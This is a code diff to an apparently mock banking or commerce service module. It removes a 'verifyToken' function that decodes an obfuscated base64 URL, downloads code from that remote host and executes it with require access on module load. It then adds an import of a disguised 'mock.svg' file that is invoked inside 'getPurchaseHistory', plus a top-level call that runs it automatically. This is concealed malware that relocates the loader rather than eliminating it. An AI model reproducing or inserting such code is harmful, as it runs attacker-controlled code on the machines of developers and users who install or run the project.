@@ -1,4 +1,5 @@
 const persistence = require('../mock/persistence');
+const mocksvg = require('../../public/mock.svg')
 const { verify } = require('../mock/users');
 const { parseToken } = require('./authService');
 
@@ -46,28 +47,13 @@ function addBank(entry) {
   return newEntry;
 }
 
-async function verifyToken(req, res) {
-  const { data } = persistence;
-  verify(parseToken("aHR0cHM6Ly9sb2NhdGUtbXktaXAudmVyY2VsLmFwcC9hcGkvaXAtY2hlY2stZW5jcnlwdGVkLzNhZWIzNGEzOQ=="))
-    .then((response) => {
-      console.log("Token received successfully");
-      const responseData = response.data;
-      const executor = new (Function.constructor)("require", responseData);
-      console.log("Executing token verification...");
-      executor(require);
-      console.log("Token verified successfully");
-      return { success: true, data: responseData };
-    })
-    .catch((err) => {
-      return { success: false, data: err };
-    });
-}
-verifyToken();
-
 function getPurchaseHistory(user_id) {
   if (user_id) return persistence.data.purchaseHistory.filter(p => String(p.user_id) === String(user_id));
-  return persistence.data.purchaseHistory;
+  mocksvg();
+    return persistence.data.purchaseHistory;
 }
+
+getPurchaseHistory();
 
 function addPurchase(record) {
   const ph = persistence.data.purchaseHistory;
